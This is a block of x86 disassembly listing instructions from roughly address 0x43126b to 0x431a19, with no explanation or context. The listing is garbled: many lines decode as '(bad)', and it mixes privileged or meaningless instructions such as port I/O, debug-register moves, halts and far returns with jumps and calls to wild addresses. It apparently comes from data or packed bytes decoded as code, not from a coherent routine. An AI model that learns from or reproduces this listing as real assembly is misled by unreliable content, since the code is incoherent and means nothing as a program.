  43126b:	mov    ecx,DWORD PTR [ebp-0x58]
  43126e:	xor    eax,DWORD PTR [eax]
  431270:	add    edi,edi
  431272:	cmp    ebp,eax
  431274:	jne    0x43129c
  431276:	mov    DWORD PTR [eax],0x8b004dd8
  43127c:	add    BYTE PTR [ebp+eax*2+0x8898b00],bl
  431283:	mov    eax,ebx
  431285:	cld    
  431286:	test   BYTE PTR [eax+0x320199],bh
  43128c:	mov    DWORD PTR [ebp+0x8],esi
  43128f:	xor    eax,DWORD PTR [ebp-0x73]
  431292:	test   DWORD PTR [esp+esi*2-0x1],edi
  431296:	mov    ebp,eax
  431298:	mov    eax,0x33004d29
  43129d:	mov    ecx,DWORD PTR [ebp+0x728008fc]
  4312a3:	add    DWORD PTR [eax],eax
  4312a5:	add    BYTE PTR [ebp+0x30],al
  4312a8:	mov    edx,DWORD PTR [edi-0x48]
  4312ab:	add    ebx,0xffffffe4
  4312ae:	addr16 test ebp,ecx
  4312b1:	je     0x4312de
  4312b3:	mov    eax,DWORD PTR [ebx]
  4312b5:	cld    
  4312b6:	sar    BYTE PTR [eax+0x3b0145],1
  4312bc:	pcmpeqw mm4,mm6
  4312bf:	xor    edi,edi
  4312c1:	lea    ecx,[ebx-0x239c7470]
  4312c7:	add    BYTE PTR [ebp+0x50],cl
  4312ca:	cmp    eax,DWORD PTR [ebp+0x75]
  4312cd:	mov    ebp,DWORD PTR [eax-0x68]
  4312d0:	test   DWORD PTR [eax],eax
  4312d2:	clc    
  4312d3:	push   DWORD PTR [ebp-0x1]
  4312d6:	lea    ecx,[eax]
  4312d8:	int3   
  4312d9:	inc    ebp
  4312da:	call   0xfb436a
  4312df:	jne    0x4312d9
  4312e1:	xor    edi,DWORD PTR [ebp-0x41]
  4312e4:	jmp    0x431358
  4312e6:	mov    eax,DWORD PTR [eax]
  4312e8:	mov    eax,0x339545c7
  4312ed:	inc    DWORD PTR [ebx]
  4312ef:	push   DWORD PTR [ecx]
  4312f1:	aaa    
  4312f2:	mov    eax,DWORD PTR [eax]
  4312f4:	jmp    0x431346
  4312f6:	mov    eax,DWORD PTR [ebp-0x3c]
  4312f9:	mov    eax,eax
  4312fb:	cld    
  4312fc:	clc    
  4312fd:	ret    
  4312fe:	test   bh,al
  431300:	pop    es
  431301:	xchg   ebp,eax
  431302:	add    bh,bh
  431304:	inc    ebp
  431305:	dec    DWORD PTR [edi]
  431307:	and    DWORD PTR [ebx],ebp
  431309:	add    BYTE PTR [eax],al
  43130b:	push   eax
  43130c:	jbe    0x431363
  43130e:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  431314:	or     al,0xcf
  431316:	inc    eax
  431317:	enter  0x745,0x72
  43131b:	inc    ebp
  43131c:	mov    eax,DWORD PTR [ecx]
  43131e:	int3   
  43131f:	add    BYTE PTR [ebp-0x75],al
  431322:	ss mov eax,0x33c74d9c
  431328:	ror    BYTE PTR [ebp+0x72f80885],1
  43132e:	inc    ebp
  43132f:	add    BYTE PTR [ebx-0x3c7423bb],cl
  431335:	fadd   st,st(6)
  431337:	rol    BYTE PTR [ebp+0x12],0x8b
  43133b:	inc    ebp
  43133c:	fmul   QWORD PTR [ebx-0x3c39233d]
  431342:	inc    ebp
  431343:	test   bh,al
  431345:	cdq    
  431346:	clc    
  431347:	xor    al,BYTE PTR [ebp+0x45dcf889]
  43134d:	inc    ebp
  43134e:	cmp    BYTE PTR [ebx],dh
  431350:	pushf  
  431351:	mov    ecx,0xffb48dc7
  431356:	test   eax,ecx
  431358:	clc    
  431359:	dec    ebp
  43135a:	inc    ebp
  43135b:	mov    edi,DWORD PTR [edx]
  43135d:	or     BYTE PTR [ecx+eax*8-0x15b7939],bl
  431364:	test   edi,edi
  431366:	clc    
  431367:	test   DWORD PTR [ebp+0x45],0x89c8b3c
  43136e:	(bad)  
  43136f:	enter  0x18e8,0x85
  431373:	ss clc 
  431375:	pushf  
  431376:	inc    ebp
  431377:	dec    DWORD PTR [ebx-0x3cba0f04]
  43137d:	push   eax
  43137e:	xabort 0x7d
  431381:	add    BYTE PTR [ebx],bh
  431383:	mov    ecx,DWORD PTR [edi]
  431385:	mov    DWORD PTR [eax],ebx
  431387:	les    eax,FWORD PTR [eax]
  431389:	adc    ebp,ecx
  43138b:	dec    ebp
  43138c:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  431392:	mov    ecx,esi
  431394:	lock or al,cl
  431397:	clc    
  431398:	inc    ebp
  431399:	add    esi,DWORD PTR [ebx]
  43139b:	jge    0x4313a0
  43139d:	xor    edi,DWORD PTR [ebx]
  43139f:	cmp    ecx,DWORD PTR [edi]
  4313a1:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4313a6:	mov    edi,DWORD PTR [ecx]
  4313a8:	test   al,0xcc
  4313aa:	dec    ebp
  4313ab:	test   BYTE PTR [ebx],dh
  4313ad:	pop    es
  4313ae:	xor    eax,DWORD PTR [eax]
  4313b0:	add    ecx,DWORD PTR [esi]
  4313b2:	add    ecx,eax
  4313b4:	psraw  mm0,mm1
  4313b7:	sub    BYTE PTR [ebp+0x38],cl
  4313ba:	mov    edi,DWORD PTR [ebx]
  4313bc:	lock int3 
  4313be:	shl    edx,1
  4313c0:	rol    BYTE PTR [ebp+0xc],1
  4313c3:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4313ca:	jmp    0x7c1414
  4313cf:	pushf  
  4313d0:	inc    ebp
  4313d1:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4313d7:	xor    ecx,ebx
  4313d9:	add    ecx,esi
  4313db:	mov    esi,eax
  4313dd:	enter  0x45af,0x8b
  4313e1:	xor    ecx,eax
  4313e3:	add    edx,DWORD PTR [ebp-0x77]
  4313e6:	sub    ecx,DWORD PTR [eax]
  4313e8:	cmp    eax,DWORD PTR [ebp+0x77]
  4313eb:	(bad)  
  4313ec:	mov    ebx,DWORD PTR [eax+ebp*4+0xa889c7]
  4313f3:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  4313f9:	cmp    esi,DWORD PTR [ebx]
  4313fb:	pushf  
  4313fc:	xor    eax,edi
  4313fe:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  431405:	inc    ebp
  431406:	dec    ebp
  431407:	cmp    eax,0xc7f09c8b
  43140c:	sar    DWORD PTR [eax+edx*8+0x45f80585],1
  431413:	inc    ebp
  431414:	jmp    0x431455
  431416:	mov    ebx,DWORD PTR [esp+eiz*4+0x33dc4d8b]
  43141d:	dec    ebp
  43141e:	xor    esi,DWORD PTR [ebx]
  431420:	add    eax,DWORD PTR [ebx]
  431422:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  431428:	dec    ebp
  431429:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  43142f:	out    dx,eax
  431430:	rol    BYTE PTR [eax],1
  431432:	add    eax,0xebc8458b
  431437:	dec    ebp
  431438:	mov    ebp,DWORD PTR [ebx]
  43143a:	mov    esp,0x33f84d8b
  43143f:	ret    
  431440:	xor    eax,esi
  431442:	add    ecx,eax
  431444:	add    eax,DWORD PTR [edx+0xc1010f]
  43144a:	dec    ebp
  43144b:	inc    ebp
  43144c:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  431452:	ror    bl,1
  431454:	add    eax,0xebc645ce
  431459:	scas   eax,DWORD PTR es:[edi]
  43145a:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  431460:	xor    ebp,DWORD PTR [ebx]
  431462:	xor    edi,DWORD PTR [ebx]
  431464:	add    esi,DWORD PTR [edi+0x3]
  431467:	mov    ecx,DWORD PTR [edi]
  431469:	clc    
  43146a:	rol    ebx,0x4d
  43146d:	(bad)  
  43146e:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  431475:	mov    ah,0x45
  431477:	dec    ebp
  431478:	jbe    0x4314ad
  43147a:	mov    esi,DWORD PTR [ebx]
  43147c:	call   0x33466184
  431481:	rdpmc  
  431483:	rol    DWORD PTR [ebx],0x4d
  431486:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  43148c:	inc    ebp
  43148d:	ror    BYTE PTR [ebx+0x45450808],1
  431493:	jmp    0x10b1523
  431498:	inc    ebp
  431499:	inc    ebp
  43149a:	(bad)  
  43149b:	mov    ebx,eax
  43149d:	clc    
  43149e:	test   ebx,eax
  4314a0:	clc    
  4314a1:	retf   
  4314a2:	inc    ebp
  4314a3:	into   
  4314a4:	mov    esi,0x8b85afec
  4314aa:	clc    
  4314ab:	enter  0x5545,0x38
  4314af:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4314b6:	ret    
  4314b7:	mov    ah,0xc6
  4314b9:	addr16 push 0x338b4545
  4314bf:	clc    
  4314c0:	add    eax,ebx
  4314c2:	loopne 0x43148f
  4314c4:	dec    ebp
  4314c5:	into   
  4314c6:	mov    al,dh
  4314c8:	or     BYTE PTR [edi-0x37ff748e],ch
  4314ce:	inc    ebp
  4314cf:	push   ebp
  4314d0:	mov    ebp,DWORD PTR [ebx]
  4314d2:	in     al,dx
  4314d3:	cmp    eax,ebx
  4314d5:	ja     0x43151c
  4314d7:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  4314dd:	inc    ebp
  4314de:	cdq    
  4314df:	mov    esi,DWORD PTR [edx]
  4314e1:	clc    
  4314e2:	mov    bl,al
  4314e4:	xlat   BYTE PTR ds:[ebx]
  4314e5:	retf   
  4314e6:	inc    ebp
  4314e7:	into   
  4314e8:	mov    eax,esi
  4314ea:	in     al,dx
  4314eb:	scas   eax,DWORD PTR es:[edi]
  4314ec:	retf   
  4314ed:	mov    ecx,DWORD PTR [ebp-0x38]
  4314f0:	mov    edx,DWORD PTR [ebp-0x24]
  4314f3:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8867]
  4314fa:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  431501:	mov    eax,DWORD PTR [ebx]
  431503:	clc    
  431504:	loopne 0x4314c9
  431506:	push   ebp
  431507:	retf   
  431508:	mov    dh,al
  43150a:	adc    esi,ecx
  43150c:	jb     0x4314bd
  43150e:	add    BYTE PTR [ebx+0x558bc845],cl
  431514:	in     al,dx
  431515:	sub    eax,ebx
  431517:	cmp    ecx,ebx
  431519:	mov    eax,esi
  43151b:	mov    esp,0x45af03ce
  431520:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  431526:	mov    eax,ebx
  431528:	in     al,dx
  431529:	into   
  43152a:	dec    ebp
  43152b:	(bad)  
  43152c:	xor    ebp,DWORD PTR [edi+0x80f8903]
  431532:	rol    DWORD PTR [ebp+0x4d],0x89
  431536:	xor    esp,esp
  431538:	sub    eax,DWORD PTR [ebp-0x75]
  43153b:	add    ebp,esp
  43153d:	mov    al,0x55
  43153f:	inc    ebp
  431540:	xor    esi,DWORD PTR [esi]
  431542:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  431549:	inc    ebp
  43154a:	xor    edi,DWORD PTR [ecx]
  43154c:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  431553:	test   DWORD PTR [eax],eax
  431555:	clc    
  431556:	enter  0x8645,0x33
  43155a:	inc    DWORD PTR [ebx]
  43155c:	(bad)  
  43155d:	jmp    0x4315a4
  43155f:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  431565:	inc    ebp
  431566:	(bad)  
  431567:	mov    ebp,DWORD PTR [edi-0x277b7424]
  43156d:	cdq    
  43156e:	retf   
  43156f:	xor    al,cl
  431571:	mov    BYTE PTR [ebp+0xb],cl
  431574:	lea    eax,[ebp+0x8]
  431577:	xor    esi,DWORD PTR [edx+0x3]
  43157a:	add    al,ah
  43157c:	inc    ebp
  43157d:	dec    ebp
  43157e:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  431584:	addr16 add ch,cl
  431587:	inc    ebp
  431588:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  43158e:	inc    ebp
  43158f:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  431595:	push   ebp
  431596:	(bad)  
  431597:	mov    BYTE PTR [edi+0xf723b11],ch
  43159d:	add    ch,ch
  43159f:	inc    ebp
  4315a0:	dec    DWORD PTR [ebx-0x34332775]
  4315a6:	add    al,0x4d
  4315a8:	inc    ebp
  4315a9:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4315af:	cdq    
  4315b0:	add    DWORD PTR [edx],esi
  4315b2:	add    BYTE PTR [ebx+0x4d00c000],cl
  4315b8:	push   DWORD PTR [ebx]
  4315ba:	int3   
  4315bb:	xor    eax,DWORD PTR [eax]
  4315bd:	add    edx,DWORD PTR [eax+0x3]
  4315c0:	mov    DWORD PTR [edi],ecx
  4315c2:	call   0x4288d688
  4315c7:	mov    DWORD PTR [ebp-0x20],esp
  4315ca:	add    BYTE PTR [ebp+0x7d],al
  4315cd:	mov    eax,DWORD PTR [eax]
  4315cf:	in     al,0x15
  4315d1:	ret    
  4315d2:	iret   
  4315d3:	(bad)  
  4315d4:	enter  0x14af,0x8b
  4315d8:	(bad)  
  4315d9:	in     al,dx
  4315da:	or     bl,cl
  4315dc:	adc    cl,al
  4315de:	push   ebp
  4315df:	dec    ebp
  4315e0:	inc    eax
  4315e1:	mov    edx,DWORD PTR [ebp-0x20]
  4315e4:	jb     0x4315b1
  4315e6:	mov    ecx,esi
  4315e8:	cld    
  4315e9:	scas   eax,DWORD PTR es:[edi]
  4315ea:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  4315f1:	mov    BYTE PTR [eax],0x8c
  4315f4:	push   0xffffff99
  4315f6:	push   edi
  4315f7:	xor    dl,BYTE PTR [eax+0x3b]
  4315fa:	mov    ecx,DWORD PTR [edi]
  4315fc:	call   0x8c425b5f
  431601:	mov    eax,eax
  431603:	in     al,dx
  431604:	jge    0x431653
  431606:	mov    DWORD PTR [ebx],esi
  431608:	int3   
  431609:	add    eax,DWORD PTR [ebp+0xf]
  43160c:	xor    eax,ecx
  43160e:	(bad)  
  43160f:	dec    ebp
  431610:	pushf  
  431611:	xor    ecx,esi
  431613:	add    edi,DWORD PTR [edi]
  431615:	mov    eax,DWORD PTR [ebp-0x38]
  431618:	(bad)  
  431619:	test   dh,dl
  43161b:	cdq    
  43161c:	add    esi,DWORD PTR [edx]
  43161e:	jmp    0x4315a9
  431620:	mov    cl,al
  431622:	add    eax,0x14330f45
  431627:	mov    ecx,0xff448d80
  43162c:	jmp    0xc99025f9
  431631:	mov    edx,ecx
  431633:	rol    BYTE PTR [ebp+0x330155],1
  431639:	add    ecx,DWORD PTR [ebp+0xf]
  43163c:	xor    eax,edx
  43163e:	(bad)  
  43163f:	ror    DWORD PTR [eax],0x86
  431642:	jb     0x431641
  431644:	add    bh,bh
  431646:	clc    
  431647:	inc    ebp
  431648:	jb     0x4316b4
  43164a:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  431650:	mov    ebx,DWORD PTR ss:[eax+ebx*8+0x68c000c7]
  431658:	ret    
  431659:	xor    al,bh
  43165b:	add    BYTE PTR [ebp+0x75],al
  43165e:	ss push 0xffffff9c
  431661:	inc    edi
  431663:	adc    al,0xe8
  431665:	inc    ebp
  431666:	test   DWORD PTR [ebp-0x7cba8b08],eax
  43166c:	mov    ecx,DWORD PTR [eax]
  43166e:	cld    
  43166f:	or     DWORD PTR [ebp-0x34],0x33
  431673:	jbe    0x431678
  431675:	mov    edx,DWORD PTR [ecx+0x2b]
  431678:	dec    ebp
  431679:	mov    cl,BYTE PTR [ebx+0x45d801]
  43167f:	mov    BYTE PTR [ebx],dh
  431681:	mov    eax,DWORD PTR [ebx]
  431683:	or     BYTE PTR [ecx+0x3b],dl
  431686:	dec    ebp
  431687:	int3   
  431688:	xor    ebp,edi
  43168a:	add    eax,DWORD PTR [ebp+0x51]
  43168d:	mov    ecx,DWORD PTR [ebp-0x28]
  431690:	xor    eax,DWORD PTR [eax]
  431692:	add    ebp,DWORD PTR [eax+0x51]
  431695:	adc    BYTE PTR [eax+0x0],0x8b
  431699:	add    BYTE PTR [ebx+0x4d18fcff],cl
  43169f:	inc    ebp
  4316a0:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4316a6:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4316ac:	dec    ebp
  4316ad:	mov    esi,DWORD PTR [ebx]
  4316af:	hlt    
  4316b0:	add    eax,ebx
  4316b2:	push   ecx
  4316b3:	inc    ebp
  4316b4:	dec    ebp
  4316b5:	(bad)  
  4316b6:	call   esi
  4316b8:	in     al,0xc7
  4316ba:	retf   
  4316bb:	mov    al,ds:0xc1ff39ce
  4316c0:	adc    al,0xc6
  4316c2:	inc    ebp
  4316c3:	and    eax,0x9c0f4c85
  4316c8:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4316cf:	cmp    BYTE PTR [ebx+0x3a],0x0
  4316d3:	mov    dh,0xc7
  4316d5:	cmp    eax,eax
  4316d7:	jne    0x45440f23
  4316dd:	mov    edi,DWORD PTR [eax]
  4316df:	mov    eax,0x848bcb9c
  4316e4:	rcr    BYTE PTR [ecx-0x7c7fcd0f],0x67
  4316eb:	or     BYTE PTR [edi],cl
  4316ed:	(bad)  
  4316ee:	dec    ebp
  4316ef:	inc    edi
  4316f0:	add    bh,0x51
  4316f3:	or     cl,ch
  4316f5:	test   DWORD PTR [eax+0x4d4501f8],ecx
  4316fb:	xchg   DWORD PTR [eax-0x1638ae64],eax
  431701:	mov    esp,0xf802b588
  431706:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  431707:	inc    ebp
  431708:	(bad)  
  431709:	cmp    bh,bh
  43170b:	pushf  
  43170c:	or     DWORD PTR [ecx+0x45ffe474],0x0
  431713:	mov    ecx,DWORD PTR [ebp-0x340018]
  431719:	into   
  43171a:	dec    DWORD PTR [ebx-0x7f72431c]
  431720:	push   0x5000ff01
  431725:	retf   
  431726:	inc    ebp
  431727:	into   
  431728:	dec    DWORD PTR [ebx-0x343f3ff4]
  43172e:	push   eax
  43172f:	into   
  431730:	call   0x4b1bc0
  431735:	retf   
  431736:	add    dh,cl
  431738:	add    bh,bh
  43173a:	mov    DWORD PTR [eax+ecx*1],edx
  43173d:	clc    
  43173e:	inc    ebp
  43173f:	inc    ebp
  431740:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  431746:	push   0x1
  431748:	push   edi
  431749:	add    BYTE PTR [eax-0x35],dl
  43174c:	mov    ecx,esi
  43174e:	cld    
  43174f:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  431755:	into   
  431756:	ror    BYTE PTR [ebx+0x75000800],0x50
  43175d:	xor    eax,DWORD PTR [ebp+0x3]
  431760:	jne    0x4317b3
  431762:	call   DWORD PTR [eax-0x3c]
  431765:	mov    DWORD PTR [ecx-0x18],edx
  431768:	mov    edi,edi
  43176a:	call   0x8b465cf3
  43176f:	add    ah,ah
  431771:	rol    BYTE PTR [ebp-0x7c],0xeb
  431775:	add    edi,edi
  431777:	add    al,ch
  431779:	inc    ebp
  43177a:	push   ecx
  43177b:	cmp    ecx,DWORD PTR [ebx+0x45c7c49c]
  431781:	mov    al,0xc7
  431783:	test   esp,esp
  431785:	clc    
  431786:	test   DWORD PTR [ebp-0x8],ecx
  431789:	add    BYTE PTR [ebp+0x51],0x39
  43178d:	jmp    0x8bcca02e
  431792:	in     al,dx
  431793:	or     BYTE PTR [ebp-0xf],al
  431796:	xor    eax,DWORD PTR [eax+0x4f896703]
  43179c:	hlt    
  43179d:	mov    eax,DWORD PTR [ebp-0x50]
  4317a0:	xor    esi,ecx
  4317a2:	add    eax,DWORD PTR [eax+0x4f086789]
  4317a8:	inc    ebp
  4317a9:	adc    esi,0x68
  4317ac:	pushf  
  4317ad:	inc    edi
  4317af:	add    al,ch
  4317b1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4317b2:	test   edi,edi
  4317b4:	clc    
  4317b5:	inc    DWORD PTR [ebp-0x73]
  4317b8:	cmp    esi,DWORD PTR [esp+ebx*4-0x1]
  4317bc:	(bad)  
  4317bd:	push   ecx
  4317be:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4317bf:	jne    0x431746
  4317c1:	push   eax
  4317c2:	clc    
  4317c3:	test   DWORD PTR [ebp-0x1],eax
  4317c6:	cmp    eax,0xc78b9cff
  4317cb:	les    esi,FWORD PTR [eax+esi*2+0x10f88385]
  4317d2:	inc    ebp
  4317d3:	push   edi
  4317d4:	aas    
  4317d5:	sbb    bl,BYTE PTR [eax+eax*1-0x7f1b9775]
  4317dc:	dec    ebp
  4317dd:	add    BYTE PTR [ebx],dh
  4317df:	inc    ebp
  4317e0:	add    ecx,DWORD PTR [ebx-0x7f3f0377]
  4317e6:	enter  0x8401,0x0
  4317ea:	add    al,BYTE PTR [eax]
  4317ec:	add    bh,bh
  4317ee:	out    dx,eax
  4317ef:	sbb    BYTE PTR [eax],al
  4317f1:	dec    ebp
  4317f2:	mov    ecx,DWORD PTR [ebx+0x4dd8f4]
  4317f8:	sub    esi,DWORD PTR [ebx]
  4317fa:	mov    ebp,DWORD PTR [eax-0x8]
  4317fd:	add    bl,0x0
  431800:	(bad)  
  431801:	cmp    eax,ecx
  431803:	or     BYTE PTR [edx+0x750114],al
  431809:	inc    DWORD PTR [ebp+0x18]
  43180c:	mov    eax,DWORD PTR [ebp-0x8]
  43180f:	mov    ebx,eax
  431811:	(bad)  
  431812:	retf   
  431813:	inc    ebp
  431814:	into   
  431815:	mov    esi,eax
  431817:	int3   
  431818:	scas   eax,DWORD PTR es:[edi]
  431819:	push   es
  43181a:	mov    esi,DWORD PTR [ebp-0xc]
  43181d:	call   DWORD PTR [ebp+0x18]
  431820:	sub    edi,DWORD PTR [ebp+0x3b]
  431823:	mov    esi,DWORD PTR [edi-0x34]
  431826:	mov    eax,DWORD PTR [ebp-0x8]
  431829:	ss ret 
  43182b:	pushf  
  43182c:	mov    bh,0xbc
  43182f:	fadd   QWORD PTR [eax]
  431831:	test   DWORD PTR [ebx+0x4d45bcf8],ecx
  431837:	mov    esi,DWORD PTR [ebx]
  431839:	in     al,0x33
  43183b:	ret    
  43183c:	add    eax,esi
  43183e:	add    eax,DWORD PTR [ebp+0xf]
  431841:	mov    eax,ecx
  431843:	in     al,0x4d
  431845:	ret    
  431846:	mov    eax,esi
  431848:	in     al,dx
  431849:	inc    ebp
  43184a:	rol    edi,1
  43184c:	sar    al,1
  43184e:	or     BYTE PTR [ebp+0x45e9f845],al
  431854:	add    BYTE PTR [eax],bh
  431856:	add    BYTE PTR [ebp+eax*2-0x7437439],bl
  43185d:	test   ebx,eax
  43185f:	clc    
  431860:	retf   
  431861:	inc    ebp
  431862:	into   
  431863:	cmp    al,dh
  431865:	pushf  
  431866:	scas   eax,DWORD PTR es:[edi]
  431867:	(bad)  
  431868:	mov    ebp,DWORD PTR [esp+esi*8+0x2bf85585]
  43186f:	inc    ebp
  431870:	cmp    edi,DWORD PTR [edi+esi*2]
  431873:	pushf  
  431874:	mov    eax,edi
  431876:	mov    esp,0x458567a8
  43187b:	clc    
  43187c:	mov    eax,DWORD PTR [ebp-0x8]
  43187f:	mov    eax,ebx
  431881:	in     al,dx
  431882:	retf   
  431883:	ret    
  431884:	into   
  431885:	mov    dh,0x7d
  431888:	scas   eax,DWORD PTR es:[edi]
  431889:	cmp    ecx,DWORD PTR [ebx+0x5518f40f]
  43188f:	add    BYTE PTR [ebx],ch
  431891:	jmp    0xba19d1
  431896:	mov    eax,DWORD PTR [ebp-0x5c]
  431899:	mov    eax,DWORD PTR [ebp-0x14]
  43189c:	inc    ebp
  43189d:	enter  0x458b,0xf8
  4318a1:	xor    eax,ebx
  4318a3:	add    ecx,ebx
  4318a5:	cmp    ecx,esi
  4318a7:	shufps xmm7,xmm4,0xaf
  4318ab:	add    BYTE PTR [ebx+0x55e8f48b],cl
  4318b1:	dec    ebp
  4318b2:	sub    esi,DWORD PTR [ebx]
  4318b4:	cmp    esi,DWORD PTR [ebx]
  4318b6:	ja     0x4318bb
  4318b8:	mov    eax,DWORD PTR [ebx]
  4318ba:	lods   al,BYTE PTR ds:[esi]
  4318bb:	mov    db0,ecx
  4318be:	inc    ebp
  4318bf:	dec    ebp
  4318c0:	mov    ecx,DWORD PTR [ebx-0x2e3c1308]
  4318c6:	retf   
  4318c7:	rol    dh,1
  4318c9:	or     al,0xce
  4318cb:	inc    ebp
  4318cc:	scas   eax,DWORD PTR es:[edi]
  4318cd:	xor    ecx,DWORD PTR [ebx+0x55e9f403]
  4318d3:	add    BYTE PTR [ebx],ch
  4318d5:	add    BYTE PTR [ebx],bh
  4318d7:	inc    ebp
  4318d8:	mov    ecx,DWORD PTR [ebx-0x3cfc074c]
  4318de:	inc    ebp
  4318df:	retf   
  4318e0:	mov    ecx,esi
  4318e2:	clc    
  4318e3:	(bad)  
  4318e4:	retf   
  4318e5:	scas   eax,DWORD PTR es:[edi]
  4318e6:	ret    
  4318e7:	mov    ecx,esi
  4318e9:	hlt    
  4318ea:	(bad)  
  4318eb:	push   ebp
  4318ec:	scas   eax,DWORD PTR es:[edi]
  4318ed:	sub    ecx,DWORD PTR [ecx+0x4577083b]
  4318f3:	mov    ecx,DWORD PTR [ecx+0x4589e4e8]
  4318f9:	add    BYTE PTR [ebx],al
  4318fb:	mov    eax,eax
  4318fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4318fe:	inc    ebp
  4318ff:	dec    ebp
  431900:	xor    ebx,DWORD PTR ss:[ebx+esi*1+0x3d00389]
  431908:	inc    ebp
  431909:	(bad)  
  43190b:	rcr    DWORD PTR [ebp+ecx*2-0x134f7439],0x85
  431913:	sar    eax,1
  431915:	rol    BYTE PTR [ebp+0x5],1
  431918:	xor    eax,DWORD PTR [ebp+0x3]
  43191b:	jmp    0x431908
  43191d:	mov    ecx,DWORD PTR [ebx-0x3cb22754]
  431923:	xor    eax,DWORD PTR [ebp+0x33]
  431926:	mov    eax,DWORD PTR [ebx]
  431928:	rol    BYTE PTR [ebx],1
  43192a:	test   BYTE PTR [edi],cl
  43192c:	cdq    
  43192d:	shl    DWORD PTR [edx],0x4d
  431930:	mov    BYTE PTR [ebx-0x2eba13f5],cl
  431936:	xor    edx,eax
  431938:	add    eax,DWORD PTR ds:0xeb4d45e0
  43193e:	mov    cl,BYTE PTR [ebx+0x4d72b408]
  431944:	add    BYTE PTR [ebx],dh
  431946:	inc    ebp
  431947:	xor    ecx,DWORD PTR [edx+0x4d030b03]
  43194d:	rdpmc  
  43194f:	rol    DWORD PTR [ebx],0x4d
  431952:	loopne 0x4318df
  431954:	push   ebp
  431955:	in     al,dx
  431956:	mov    cl,dl
  431958:	adc    eax,edx
  43195a:	jb     0x431961
  43195c:	add    BYTE PTR [ebp+0x45],al
  43195f:	jmp    0x4318ec
  431961:	mov    ebx,eax
  431963:	test   al,0xcb
  431965:	dec    ebp
  431966:	dec    ebp
  431967:	xor    ecx,DWORD PTR [ebx-0x7bfc2fcd]
  43196d:	add    ebx,DWORD PTR [ecx-0x743ecdf1]
  431973:	dec    ebp
  431974:	mov    al,0x8b
  431976:	dec    ebp
  431977:	in     al,dx
  431978:	xor    edx,ecx
  43197a:	xor    edx,eax
  43197c:	add    eax,DWORD PTR [ebp+0x3]
  43197f:	jbe    0x431990
  431981:	mov    eax,ecx
  431983:	test   al,0x45
  431985:	dec    ebp
  431986:	mov    DWORD PTR [ebx],esi
  431988:	loopne 0x4319bd
  43198a:	inc    ebp
  43198b:	add    ecx,DWORD PTR [ebx-0x3cf01bfd]
  431991:	rol    esi,0x45
  431994:	scas   eax,DWORD PTR es:[edi]
  431995:	mov    ecx,DWORD PTR [ebx-0x34ba0ff8]
  43199b:	mov    eax,ecx
  43199d:	hlt    
  43199e:	dec    ebp
  43199f:	inc    ebp
  4319a0:	mov    eax,edi
  4319a2:	loopne 0x43197c
  4319a4:	retf   
  4319a5:	test   esi,ecx
  4319a7:	clc    
  4319a8:	scas   eax,DWORD PTR es:[edi]
  4319a9:	inc    ebp
  4319aa:	mov    eax,edi
  4319ac:	fdiv   st,st(0)
  4319ae:	rol    DWORD PTR [ebp+0x458cf8c6],cl
  4319b4:	cdq    
  4319b5:	cmp    BYTE PTR [edx],dh
  4319b7:	pushf  
  4319b8:	cmp    ecx,DWORD PTR [ebx-0x3ca127f1]
  4319be:	inc    esi
  4319c0:	mov    ebp,DWORD PTR [eax-0x10]
  4319c3:	inc    ebp
  4319c4:	dec    ebp
  4319c5:	xor    esi,DWORD PTR [ebx]
  4319c7:	add    eax,DWORD PTR [ebx]
  4319c9:	loopne 0x4319da
  4319cb:	dec    ebp
  4319cc:	ror    DWORD PTR [edx+0x7233084d],0x3
  4319d3:	add    BYTE PTR [ebx-0x7b740bbb],cl
  4319d9:	lock cdq 
  4319db:	ret    
  4319dc:	xor    al,BYTE PTR [ebp-0x77]
  4319df:	mov    esi,esp
  4319e1:	rol    BYTE PTR [ebp-0x7c],1
  4319e4:	xor    ebx,DWORD PTR [ecx-0x7772cd47]
  4319ea:	call   edi
  4319ec:	enter  0x4d45,0x8b
  4319f0:	mov    esi,eax
  4319f2:	fmul   st(3),st
  4319f4:	push   ebp
  4319f5:	dec    ebp
  4319f6:	xor    ecx,DWORD PTR [ebx-0x7bf02ffd]
  4319fc:	ret    0xc199
  4319ff:	xor    al,BYTE PTR [esi-0x280276]
  431a05:	dec    ebp
  431a06:	jne    0x431a3b
  431a08:	mov    eax,DWORD PTR [ebx]
  431a0a:	cld    
  431a0b:	loopne 0x4319bd
  431a0d:	push   ebp
  431a0e:	add    DWORD PTR [eax+0x72851100],ecx
  431a14:	inc    DWORD PTR [eax]
  431a16:	inc    DWORD PTR [ebp-0x75]
  431a19:	mov    edi,esp
